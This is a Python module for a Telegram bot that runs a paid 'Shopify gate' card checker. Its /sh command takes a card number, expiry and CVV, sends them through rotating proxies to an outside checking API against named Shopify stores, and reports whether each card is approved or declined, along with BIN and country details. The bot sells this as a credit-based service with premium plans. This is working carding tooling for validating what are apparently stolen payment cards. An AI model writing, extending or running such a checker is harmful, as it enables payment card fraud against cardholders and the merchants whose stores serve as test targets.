import aiohttp
import asyncio
import time
import re
import json
import random
from html import escape
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, ContextTypes
from config import get_bin_info, kb_result, OWNER_ID, FORCE_CHANNELS, SUPPORT_LINK, API_TIMEOUT

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🛒 SHOPIFY API CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SHOPII_API_BASE = "https://goshopi.up.railway.app/shopii"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITES & PROXY LOADERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def load_sites():
    try:
        with open("sites.txt", "r") as f:
            sites = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        if sites:
            return sites
    except FileNotFoundError:
        pass
    # Fallback if sites.txt is missing or empty
    return ["1898-products.myshopify.com", "anotherseasonwaco.myshopify.com"]

def load_proxies():
    try:
        with open("px.txt", "r") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        return []

SITES = load_sites()
PROXIES = load_proxies()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# USER DATA HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def get_user_data(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> dict:
    uid = str(user_id)
    if "user_data" not in context.bot_data:
        context.bot_data["user_data"] = {}
    if uid not in context.bot_data["user_data"]:
        context.bot_data["user_data"][uid] = {
            "name": "User", "credits": 150, "plan": "TRIAL",
            "expires": 0, "pre_premium_credits": 0
        }
    return context.bot_data["user_data"][uid]

def is_user_premium(ud: dict) -> bool:
    raw_plan = ud.get("plan", "TRIAL").upper()
    if raw_plan == "TRIAL":
        return False
    if ud.get("expires", 0) <= time.time():
        ud["plan"] = "TRIAL"
        ud["credits"] = ud.get("pre_premium_credits", 150)
        ud["expires"] = 0
        return False
    return True

def get_styled_plan(raw_plan: str) -> str:
    plan_upper = raw_plan.upper()
    if plan_upper == "CORE":   return "✨ Cᴏʀᴇ ✨"
    elif plan_upper == "ELITE": return "⭐ Eʟɪᴛᴇ ⭐"
    elif plan_upper == "ROOT":  return "👑 Rᴏᴏᴛ 👑"
    else: return "Tʀɪᴀʟ"

async def _check_force_sub(user_id: int, context) -> list:
    if user_id == OWNER_ID:
        return []
    not_joined = []
    for name, link in FORCE_CHANNELS:
        try:
            member = await context.bot.get_chat_member(f"@{name}", user_id)
            if member.status in ("left", "kicked"):
                not_joined.append((name, link))
        except Exception:
            pass
    return not_joined

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SHOPIFY API CHECKER (via goshopi.up.railway.app)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _pretty(raw) -> str:
    """Return a clean, readable string from the API response."""
    if isinstance(raw, dict):
        for key in ("message", "status", "result", "response", "detail", "error", "msg"):
            val = raw.get(key)
            if val and isinstance(val, str):
                return val
        return json.dumps(raw, ensure_ascii=False)
    return str(raw)

def classify_response(raw) -> tuple[str, str]:
    """
    Returns ("APPROVED", display_msg) or ("DECLINED", display_msg).
    Checks approve keywords first, then decline keywords.
    """
    raw_str = json.dumps(raw).lower() if isinstance(raw, dict) else str(raw).lower()

    approve_kw = [
        "approved", "approval", "success", "charged", "captured",
        "transaction approved", "payment approved"
    ]
    decline_kw = [
        "declined", "decline", "card declined", "failed", "failure",
        "insufficient", "do not honor", "invalid card", "expired",
        "incorrect cvc", "stolen", "blocked", "error"
    ]

    for kw in approve_kw:
        if kw in raw_str:
            return "APPROVED", _pretty(raw)

    for kw in decline_kw:
        if kw in raw_str:
            return "DECLINED", _pretty(raw)

    # Unknown response — treat as declined but still show raw
    return "DECLINED", _pretty(raw)


async def check_via_api(cc: str, month: str, year: str, cvv: str,
                        site: str | None, proxy: str | None) -> tuple[str, str, str]:
    """
    Calls goshopi API. Returns (status, display_response, site_used).
    status is "APPROVED" or "DECLINED".
    """
    # API expects full 4-digit year
    if len(year) == 2:
        year = "20" + year

    cc_param = f"{cc}|{month}|{year}|{cvv}"
    params: dict = {"cc": cc_param}

    site_used = site or random.choice(SITES)
    params["site"] = site_used

    if proxy:
        params["proxy"] = proxy

    timeout = aiohttp.ClientTimeout(total=API_TIMEOUT if API_TIMEOUT else 60)

    async with aiohttp.ClientSession(timeout=timeout) as session:
        async with session.get(SHOPII_API_BASE, params=params) as resp:
            try:
                data = await resp.json(content_type=None)
            except Exception:
                text = await resp.text()
                data = text.strip()

    status, msg = classify_response(data)
    return status, msg, site_used


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /sh COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text("⚠️ Bot is under maintenance. Try again later.")
        return

    if not context.bot_data.get("sh_on", True):
        await update.message.reply_text(
            "⚠️ Sʜᴏᴘɪꜰʏ gate is currently <b>OFF</b>.", parse_mode="HTML"
        )
        return

    not_joined = await _check_force_sub(user.id, context)
    if not_joined:
        rows = [[InlineKeyboardButton(f"➺ Join @{n}", url=l)] for n, l in not_joined]
        rows.append([InlineKeyboardButton("✅ I Joined — Verify Now", callback_data="check_sub")])
        await update.message.reply_text(
            "<b>[ 𖥷iТ ] ➺ Jᴏɪɴ Rᴇǫᴜɪʀᴇᴅ</b>\n"
            "━━━━━━━━━━━━━━━━━\n"
            "Join our channel & group to use this bot.\n"
            "━━━━━━━━━━━━━━━━━",
            reply_markup=InlineKeyboardMarkup(rows),
            parse_mode="HTML"
        )
        return

    # ── Parse card ──
    card_str = None
    if context.args:
        card_str = context.args[0].strip()
    elif update.message.reply_to_message:
        replied_text = (
            update.message.reply_to_message.text
            or update.message.reply_to_message.caption
            or ""
        )
        match = re.search(
            r'(\d{13,19})\s*[|,;\s]\s*(\d{1,2})\s*[|,;\s]\s*(\d{2,4})\s*[|,;\s]\s*(\d{3,4})',
            replied_text
        )
        if match:
            card_str = f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
        else:
            match = re.search(r'\b(\d{13,19})\b', replied_text)
            if match:
                card_str = match.group(1)

    if not card_str:
        await update.message.reply_text(
            "⚠️ <b>Uꜱᴀɢᴇ:</b>\n<code>/sh cc|mm|yy|cvv</code>\n\n"
            "<b>Example:</b>\n<code>/sh 4111111111111111|12|26|123</code>",
            parse_mode="HTML"
        )
        return

    parts = card_str.split("|")
    if len(parts) != 4:
        await update.message.reply_text(
            "❌ Invalid format. Use: <code>cc|mm|yy|cvv</code>", parse_mode="HTML"
        )
        return

    cc_num, mm, yy, cvv = [p.strip() for p in parts]

    # ── Credits check ──
    ud = get_user_data(user.id, context)
    premium = is_user_premium(ud)

    if not premium:
        if ud.get("credits", 0) <= 0:
            await update.message.reply_text(
                "<b>[ 𖥷iТ ] ➺ Nᴏ Cʀᴇᴅɪᴛꜱ ❌</b>\n"
                "━━━━━━━━━━━━━━━━━\n"
                "You have no credits left.\n"
                "Redeem a code with /rm or buy a plan.\n"
                "━━━━━━━━━━━━━━━━━",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💎 BUY PREMIUM", callback_data="mprice")],
                    [InlineKeyboardButton("📞 Support", url=SUPPORT_LINK)]
                ])
            )
            return
        ud["credits"] -= 1

    msg = await update.message.reply_text(
        "⏳ <b>[ 𖥷iТ ] ➺ Cʜᴇᴄᴋɪɴɢ Sʜᴏᴘɪꜰʏ...</b>",
        parse_mode="HTML"
    )
    start_time = time.time()
    bin_num = cc_num[:6]
    proxy = random.choice(PROXIES) if PROXIES else None

    try:
        # Run API check and BIN lookup concurrently
        api_task = asyncio.create_task(
            check_via_api(cc_num, mm, yy, cvv, site=None, proxy=proxy)
        )
        bin_task = asyncio.create_task(get_bin_info(bin_num))

        status, raw_response, site_used = await api_task
        bin_data = await bin_task

        # ── Status label ──
        status_ui = "Aᴘᴘʀᴏᴠᴇᴅ ✅" if status == "APPROVED" else "Dᴇᴄʟɪɴᴇᴅ ❌"

        # ── BIN info ──
        bin_txt = "N/A"
        country = "N/A"
        flag = ""
        if not bin_data.get("error"):
            s = str(bin_data.get("scheme", "N/A")).upper()
            t = str(bin_data.get("type", "N/A")).upper()
            b = bin_data.get("bank", "N/A")
            country = str(bin_data.get("country", "N/A")).upper()
            flag = bin_data.get("country_emoji", "")
            bin_txt = f"{s} - {t} - {b}"

        time_taken = f"{time.time() - start_time:.2f}"
        plan_ui = get_styled_plan(ud.get("plan", "TRIAL").upper())
        username = user.first_name or "User"

        safe_response = escape(str(raw_response))
        safe_proxy = escape(proxy if proxy else "None")

        text = (
            f"<b>[ 𖥷iТ ] ➺ {status_ui}</b>\n"
            f"🔍 ➺ <code>{escape(card_str)}</code>\n"
            f"Gᴀᴛᴇ ➺ Sʜᴏᴘɪꜰʏ 🛒 🟢\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🌐 𝗦𝗜𝗧𝗘 ➺ {escape(site_used)}\n"
            f"🔒 𝗣𝗥𝗢𝗫𝗬 ➺ {safe_proxy}\n"
            f"📜 𝗥𝗘𝗦𝗣 ➺ {safe_response}\n"
            f"⏱️ 𝗧𝗜𝗠𝗘 ➺ {time_taken}s\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🏦 𝗕𝗜𝗡 ➺ {bin_txt}\n"
            f"🌍 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ➺ {flag} {country}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🦇 𝗨𝘀𝗲𝗿 ➺ {escape(username)} ({plan_ui})\n"
            f"📢 @Batcardchk"
        )

        await msg.edit_text(
            text,
            parse_mode="HTML",
            reply_markup=kb_result(premium),
            disable_web_page_preview=True
        )

    except asyncio.TimeoutError:
        if not premium:
            ud["credits"] = ud.get("credits", 0) + 1
        await msg.edit_text(
            "<b>[ 𖥷iТ ] ➺ Tɪᴍᴇᴏᴜᴛ ❌</b>\n"
            "━━━━━━━━━━━━━━━━━\n"
            "API took too long. Try again.\n"
            "━━━━━━━━━━━━━━━━━",
            parse_mode="HTML"
        )

    except Exception as e:
        if not premium:
            ud["credits"] = ud.get("credits", 0) + 1
        await msg.edit_text(
            f"<b>[ 𖥷iТ ] ➺ Eʀʀᴏʀ ❌</b>\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"<code>{escape(str(e)[:200])}</code>\n"
            f"━━━━━━━━━━━━━━━━━",
            parse_mode="HTML"
        )


def get_sh_handler():
    return CommandHandler("sh", cmd_sh)
